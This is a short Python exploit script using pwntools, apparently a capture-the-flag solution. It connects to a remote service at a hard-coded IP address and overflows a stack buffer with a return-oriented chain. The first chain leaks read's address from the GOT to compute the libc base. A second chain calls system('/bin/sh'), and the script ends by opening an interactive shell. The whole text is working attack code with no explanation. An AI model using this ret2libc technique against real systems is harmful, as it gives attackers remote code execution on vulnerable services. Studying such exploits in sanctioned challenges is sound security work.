from pwn import *
r=remote("27.25.151.26",23544)
write_plt=0x401060
write_got=0x404018
read_got=0x404020
setbuf_got=0x404028
rdi_add=0x40117e
rsi_add=0x401180
rdx_add=0x401182
vuln_add=0x4011EC
ret_add=0x40101a
pay=b'a'*24+p64(rdi_add)+p64(1)+p64(rsi_add)+p64(read_got)+p64(rdx_add)+p64(0x8)+p64(write_plt)+p64(vuln_add)
r.recvuntil(b"Libc how to win?\n")


r.send(pay)
libc=ELF("./libc.so.6")
libc_base=u64(r.recv(8).ljust(8,b'\x00'))-libc.sym["read"]
print(hex(libc_base))

pay=b'a'*24+p64(rdi_add)+p64(libc_base+next(libc.search(b"/bin/sh\x00")))+p64(ret_add)+p64(libc_base+libc.sym["system"])
r.send(pay)
r.interactive()
